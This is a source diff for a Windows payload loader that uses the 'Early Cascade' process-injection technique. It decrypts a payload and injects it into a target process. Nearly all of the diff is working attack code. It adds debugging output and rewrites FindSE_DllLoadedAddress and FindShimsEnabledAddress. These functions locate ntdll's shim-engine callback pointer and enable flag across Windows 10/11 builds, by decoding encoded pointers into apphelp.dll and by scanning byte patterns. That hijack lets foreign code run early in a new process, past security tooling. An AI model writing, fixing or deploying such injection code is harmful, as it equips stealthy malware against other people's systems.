@@ -679,7 +679,8 @@ int main(int argc, char** argv) {{
 #endif
     
     if (!PerformInjection(&ctx)) {{
-        LOG_ERROR("Injection failed");
+        printf("[!] Injection failed\n");
+        fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return -1;
     }}
@@ -996,7 +997,8 @@ static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
     ctx.dwInjectionMethod = INJECTION_METHOD;
 
     if (!PerformInjection(&ctx)) {{
-        LOG_ERROR("Injection failed");
+        printf("[!] Injection failed\n");
+        fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return 1;
     }}
@@ -1325,7 +1327,8 @@ static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
     ctx.dwInjectionMethod = INJECTION_METHOD;
 
     if (!PerformInjection(&ctx)) {{
-        LOG_ERROR("Injection failed");
+        printf("[!] Injection failed\n");
+        fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return 1;
     }}
@@ -3725,7 +3728,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 #include <string.h>
 
 // Always-on Early Cascade diagnostics (unconditional printf for failure diagnosis)
-#define LOG_EC(fmt, ...) printf("[EarlyCascade] " fmt "\n", ##__VA_ARGS__)
+#define LOG_EC(fmt, ...) do { printf("[EarlyCascade] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)
 
 #ifndef LOG_ERROR
 #define LOG_ERROR(fmt, ...)
@@ -3807,9 +3810,21 @@ static DWORD GetNtdllSectionSize(ULONG_PTR baseAddress, const char* name) {
 
 // ============================================================================
 // FindSE_DllLoadedAddress
-// Scans .text for patterns preceding the RIP-relative disp32 pointing to
-// g_pfnSE_DllLoaded in .mrdata. Supports all Windows 10/11 builds via
-// multiple byte patterns and a RIP-relative fallback scan.
+// Cross-version approach for all Windows 10/11 builds:
+//
+// Strategy A (primary): Load apphelp.dll, get SE_DllLoaded export, then scan
+//   ntdll .mrdata for the RtlEncodePointer-encoded value of that address.
+//   The slot containing the encoded pointer IS g_pfnSE_DllLoaded.
+//   Walk ntdll .text backward to find the MOV instruction loading from that slot
+//   and return its RIP-offset operand address as ppOffsetAddress.
+//
+// Strategy B (fallback): Scan .text for ALL RIP-relative MOV reg,[rip+disp32]
+//   instructions whose resolved .mrdata slot, when decoded via RtlDecodePointer,
+//   produces an address inside apphelp.dll .text. No NULL-slot requirement.
+//
+// Strategy C (last resort): If apphelp.dll cannot be loaded, fall back to
+//   the original Tier-1 + Tier-2 scan but WITHOUT the NULL-slot requirement
+//   (accept any 8-byte-aligned .mrdata slot).
 // ============================================================================
 
 LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
@@ -3819,20 +3834,125 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
     ULONG_PTR mrdataBase = GetNtdllSectionBase(base, ".mrdata");
     DWORD     mrdataSize = GetNtdllSectionSize(base, ".mrdata");
 
-    if (!textBase || !textSize || !mrdataBase || !mrdataSize)
+    if (!textBase || !textSize || !mrdataBase || !mrdataSize) {
+        LOG_EC("FindSE: section lookup failed (text=%p/%lX mrdata=%p/%lX)",
+               (void*)textBase, textSize, (void*)mrdataBase, mrdataSize);
+        if (ppOffsetAddress) *ppOffsetAddress = NULL;
         return NULL;
+    }
 
-    // Tier 1: Multiple byte patterns across Windows builds
-    // Win10 21H2/22H2: mov edx,[gs:330h]; mov eax,edx; mov rdi,[rel ...]
+    LOG_EC("FindSE: ntdll=%p text=%p+%lX mrdata=%p+%lX",
+           hNtDLL, (void*)textBase, textSize, (void*)mrdataBase, mrdataSize);
+
+    // ---- Strategy A/B: apphelp.dll-based detection -------------------------
+    typedef PVOID (NTAPI *pfn_RtlDecodePointer)(PVOID);
+    pfn_RtlDecodePointer pRtlDecode =
+        (pfn_RtlDecodePointer)GetProcAddress((HMODULE)hNtDLL, "RtlDecodePointer");
+
+    HMODULE hApphelp = GetModuleHandleA("apphelp.dll");
+    BOOL bNeedsFreeApphelp = FALSE;
+    if (!hApphelp) {
+        hApphelp = LoadLibraryA("apphelp.dll");
+        bNeedsFreeApphelp = (hApphelp != NULL);
+    }
+
+    if (hApphelp && pRtlDecode) {
+        // Get apphelp.dll text section bounds for validation
+        ULONG_PTR ahBase     = (ULONG_PTR)hApphelp;
+        ULONG_PTR ahTextBase = GetNtdllSectionBase(ahBase, ".text");
+        DWORD     ahTextSize = GetNtdllSectionSize(ahBase, ".text");
+
+        LOG_EC("FindSE: apphelp=%p textBase=%p+%lX", (void*)ahBase, (void*)ahTextBase, ahTextSize);
+
+        if (ahTextBase && ahTextSize) {
+            // Strategy A: scan .mrdata for encoded pointer into apphelp .text
+            ULONG_PTR* pSlot    = (ULONG_PTR*)mrdataBase;
+            ULONG_PTR* pSlotEnd = (ULONG_PTR*)(mrdataBase + mrdataSize);
+            while (pSlot < pSlotEnd) {
+                if (((ULONG_PTR)pSlot & 7) == 0 && *pSlot != 0) {
+                    ULONG_PTR decoded = (ULONG_PTR)pRtlDecode((PVOID)*pSlot);
+                    if (decoded >= ahTextBase && decoded < ahTextBase + ahTextSize) {
+                        LOG_EC("FindSE: Strategy A hit: slot=%p encoded=%p decoded=%p (apphelp.text)",
+                               (void*)pSlot, (void*)*pSlot, (void*)decoded);
+
+                        // Find the .text instruction that references this slot
+                        // Scan .text for REX.W MOV reg,[rip+disp32] resolving to pSlot
+                        LPBYTE pCur    = (LPBYTE)textBase;
+                        LPBYTE pTxtEnd = pCur + textSize;
+                        LPBYTE pBestMatch = NULL;
+                        while (pCur + 7 <= pTxtEnd) {
+                            if ((pCur[0] == 0x48 || pCur[0] == 0x4C) && pCur[1] == 0x8B) {
+                                if ((pCur[2] & 0xC7) == 0x05) {
+                                    LPBYTE pOff = pCur + 3;
+                                    if (pOff + 4 <= pTxtEnd) {
+                                        INT32  rel = *(INT32*)pOff;
+                                        ULONG_PTR resolved = (ULONG_PTR)(pOff + 4 + rel);
+                                        if (resolved == (ULONG_PTR)pSlot) {
+                                            pBestMatch = pOff;
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                            pCur++;
+                        }
+
+                        // When the referencing instruction was not found, pass mrdataBase as
+                        // offset so FindShimsEnabledAddress falls into its full-.text scan path.
+                        if (ppOffsetAddress) *ppOffsetAddress = pBestMatch ? pBestMatch : (LPVOID)(mrdataBase);
+                        if (bNeedsFreeApphelp) FreeLibrary(hApphelp);
+                        return (LPVOID)pSlot;
+                    }
+                }
+                pSlot++;
+            }
+            LOG_EC("FindSE: Strategy A found no apphelp-encoded pointer in .mrdata");
+
+            // Strategy B: scan .text for any RIP-relative MOV that decodes to apphelp .text
+            LPBYTE pCur    = (LPBYTE)textBase;
+            LPBYTE pTxtEnd = pCur + textSize;
+            while (pCur + 7 <= pTxtEnd) {
+                if ((pCur[0] == 0x48 || pCur[0] == 0x4C) && pCur[1] == 0x8B) {
+                    if ((pCur[2] & 0xC7) == 0x05) {
+                        LPBYTE pOff = pCur + 3;
+                        if (pOff + 4 <= pTxtEnd) {
+                            INT32      rel      = *(INT32*)pOff;
+                            ULONG_PTR  resolved = (ULONG_PTR)(pOff + 4 + rel);
+                            if (resolved >= mrdataBase && resolved < mrdataBase + mrdataSize) {
+                                if ((resolved & 7) == 0) {
+                                    ULONG_PTR slotVal = *(ULONG_PTR*)resolved;
+                                    if (slotVal != 0) {
+                                        ULONG_PTR decoded = (ULONG_PTR)pRtlDecode((PVOID)slotVal);
+                                        if (decoded >= ahTextBase && decoded < ahTextBase + ahTextSize) {
+                                            LOG_EC("FindSE: Strategy B hit: instr=%p slot=%p decoded=%p",
+                                                   pCur, (void*)resolved, (void*)decoded);
+                                            if (ppOffsetAddress) *ppOffsetAddress = pOff;
+                                            if (bNeedsFreeApphelp) FreeLibrary(hApphelp);
+                                            return (LPVOID)resolved;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                pCur++;
+            }
+            LOG_EC("FindSE: Strategy B found no apphelp-decoded slot in .mrdata");
+        }
+    }
+
+    if (bNeedsFreeApphelp && hApphelp) FreeLibrary(hApphelp);
+
+    // ---- Strategy C: original Tier-1 patterns WITHOUT NULL-slot requirement ---
+    LOG_EC("FindSE: falling back to Strategy C (pattern scan, no NULL requirement)");
+
     static BYTE pat1[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
                            0x8B, 0xC2, 0x48, 0x8B, 0x3D };
-    // Win10 1909/2004: mov rax,[rel ...]
+    // Generic 3-byte patterns: only accept resolves INTO .mrdata, 8-byte aligned
     static BYTE pat2[] = { 0x48, 0x8B, 0x05 };
-    // Win11 22H2/23H2/24H2: mov rdi,[rel ...]
     static BYTE pat3[] = { 0x48, 0x8B, 0x3D };
-    // Win11 build 26100+: mov r13,[rel ...]
     static BYTE pat4[] = { 0x4C, 0x8B, 0x2D };
-    // Win11 23H2 variant: mov rcx,[rip+...]
     static BYTE pat5[] = { 0x48, 0x8B, 0x0D };
 
     struct { LPBYTE pat; DWORD len; } patterns[] = {
@@ -3843,63 +3963,52 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
         { pat5, sizeof(pat5) },
     };
 
-    for (int p = 0; p < 5; p++) {
+    LPBYTE pTxtEnd = (LPBYTE)(textBase + textSize);
+
+    // For pat1 (unique 12-byte pattern), single match is reliable
+    {
         LPBYTE pCur = (LPBYTE)textBase;
-        LPBYTE pTextEnd = pCur + textSize;
-        while (pCur < pTextEnd) {
-            LPBYTE pFound = (LPBYTE)FindPattern(pCur, (DWORD)(pTextEnd - pCur),
-                                                patterns[p].pat, patterns[p].len);
-            if (!pFound) break;
-            LPBYTE pOffsetPtr = pFound + patterns[p].len;
-            // Safety: need 4 more bytes for the RIP offset
-            if (pOffsetPtr + 4 > pTextEnd) {
-                pCur = pFound + 1;
-                continue;
+        LPBYTE pFound = (LPBYTE)FindPattern(pCur, textSize, pat1, sizeof(pat1));
+        if (pFound) {
+            LPBYTE pOff = pFound + sizeof(pat1);
+            if (pOff + 4 <= pTxtEnd) {
+                INT32  rel      = *(INT32*)pOff;
+                LPVOID pResolved = (LPVOID)(pOff + 4 + rel);
+                if ((ULONG_PTR)pResolved >= mrdataBase &&
+                    (ULONG_PTR)pResolved <  mrdataBase + mrdataSize) {
+                    LOG_EC("FindSE: Strategy C Tier-1/pat1 hit @ %p -> slot=%p", pFound, pResolved);
+                    if (ppOffsetAddress) *ppOffsetAddress = pOff;
+                    return pResolved;
+                }
             }
-            INT32  relOffset  = *(INT32*)pOffsetPtr;
-            LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
-            if ((ULONG_PTR)pResolved >= mrdataBase &&
-                (ULONG_PTR)pResolved < mrdataBase + mrdataSize) {
-                LOG_EC("FindSE_DllLoadedAddress: Tier-1 pattern %d matched @ %p -> %p", p, pFound, pResolved);
-                if (ppOffsetAddress) *ppOffsetAddress = pOffsetPtr;
-                return pResolved;
+        }
+    }
+
+    // For generic 3-byte patterns: scan ALL matches and pick the .mrdata-aligned one
+    for (int p = 1; p < 5; p++) {
+        LPBYTE pCur = (LPBYTE)textBase;
+        while (pCur < pTxtEnd) {
+            LPBYTE pFound = (LPBYTE)FindPattern(pCur, (DWORD)(pTxtEnd - pCur),
+                                                 patterns[p].pat, patterns[p].len);
+            if (!pFound) break;
+            LPBYTE pOff = pFound + patterns[p].len;
+            if (pOff + 4 <= pTxtEnd) {
+                INT32  rel      = *(INT32*)pOff;
+                LPVOID pResolved = (LPVOID)(pOff + 4 + rel);
+                if ((ULONG_PTR)pResolved >= mrdataBase &&
+                    (ULONG_PTR)pResolved <  mrdataBase + mrdataSize &&
+                    ((ULONG_PTR)pResolved & 7) == 0) {
+                    LOG_EC("FindSE: Strategy C Tier-1/pat%d hit @ %p -> slot=%p (val=%p)",
+                           p+1, pFound, pResolved, (void*)*(ULONG_PTR*)pResolved);
+                    if (ppOffsetAddress) *ppOffsetAddress = pOff;
+                    return pResolved;
+                }
             }
             pCur = pFound + 1;
         }
     }
 
-    // Tier 2: RIP-relative scan — find any REX.W MOV reg,[rip+disp32] in .text
-    // whose resolved target falls in .mrdata AND the slot currently holds NULL
-    // (validates it is an unset function pointer, not an arbitrary data pointer)
-    LPBYTE pCur = (LPBYTE)textBase;
-    LPBYTE pTextEnd = pCur + textSize;
-    while (pCur + 7 <= pTextEnd) {
-        // Look for 48/4C 8B (REX.W MOV) patterns
-        if ((pCur[0] == 0x48 || pCur[0] == 0x4C) && pCur[1] == 0x8B) {
-            // ModRM: mod=00, reg=xxx, rm=101 (RIP-relative) => byte & 0xC7 == 0x05
-            if ((pCur[2] & 0xC7) == 0x05) {
-                LPBYTE pOffsetPtr = pCur + 3;
-                if (pOffsetPtr + 4 <= pTextEnd) {
-                    INT32  relOffset = *(INT32*)pOffsetPtr;
-                    LPVOID pResolved = (LPVOID)(pOffsetPtr + 4 + relOffset);
-                    if ((ULONG_PTR)pResolved >= mrdataBase &&
-                        (ULONG_PTR)pResolved < mrdataBase + mrdataSize) {
-                        // Candidate: check it's an 8-byte aligned slot (function pointer)
-                        // and the slot currently holds NULL (unset callback)
-                        if (((ULONG_PTR)pResolved & 7) == 0 &&
-                            *(ULONG_PTR*)pResolved == 0) {
-                            LOG_EC("FindSE_DllLoadedAddress: Tier-2 matched @ %p -> %p (slot=NULL)", pCur, pResolved);
-                            if (ppOffsetAddress) *ppOffsetAddress = pOffsetPtr;
-                            return pResolved;
-                        }
-                    }
-                }
-            }
-        }
-        pCur++;
-    }
-
-    LOG_EC("FindSE_DllLoadedAddress: all patterns failed");
+    LOG_EC("FindSE: ALL strategies exhausted -- g_pfnSE_DllLoaded not found");
     if (ppOffsetAddress) *ppOffsetAddress = NULL;
     return NULL;
 }
@@ -3934,6 +4043,10 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     LPBYTE textStart = (LPBYTE)textBase;
     LPBYTE textEnd   = textStart + textSize;
 
+    // Determine if pDllLoadedOffsetAddress is inside .text or not (Strategy A mrdata fallback)
+    BOOL bOffsetInText = ((ULONG_PTR)pDllLoadedOffsetAddress >= textBase &&
+                          (ULONG_PTR)pDllLoadedOffsetAddress < textBase + textSize);
+
     // Pattern 1: C6 05 ?? ?? ?? ?? 01   mov byte ptr [g_ShimsEnabled], 1  pcOff=4
     // Pattern 2: 44 38 25 ?? ?? ?? ??   cmp byte ptr [g_ShimsEnabled], r12b  pcOff=4
     static BYTE pat1[] = { 0xC6, 0x05 };
@@ -3945,11 +4058,18 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     };
 
     for (int p = 0; p < 2; p++) {
-        // Search ±0xFF bytes around the offset address, clamped to .text bounds
-        LPBYTE rawStart = (LPBYTE)pDllLoadedOffsetAddress - 0xFF;
-        LPBYTE rawEnd   = (LPBYTE)pDllLoadedOffsetAddress + 0xFF;
-        LPBYTE scanStart = rawStart < textStart ? textStart : rawStart;
-        LPBYTE scanEnd   = rawEnd   > textEnd   ? textEnd   : rawEnd;
+        LPBYTE scanStart, scanEnd;
+        if (bOffsetInText) {
+            // Search ±0xFF bytes around the offset address, clamped to .text bounds
+            LPBYTE rawStart = (LPBYTE)pDllLoadedOffsetAddress - 0xFF;
+            LPBYTE rawEnd   = (LPBYTE)pDllLoadedOffsetAddress + 0xFF;
+            scanStart = rawStart < textStart ? textStart : rawStart;
+            scanEnd   = rawEnd   > textEnd   ? textEnd   : rawEnd;
+        } else {
+            // Strategy A fallback: offset is in .mrdata, scan full .text
+            scanStart = textStart;
+            scanEnd   = textEnd;
+        }
 
         if (scanStart >= scanEnd)
             continue;
@@ -4127,6 +4247,8 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     BOOL   bSuccess             = FALSE;
 
     LOG_INFO("EarlyCascade: Starting injection into %ls", pCtx->wszTargetProcess);
+    printf("[EarlyCascade] InjectEarlyCascade called, target=%ls\n", pCtx->wszTargetProcess);
+    fflush(stdout);
 
     si.cb = sizeof(si);
 
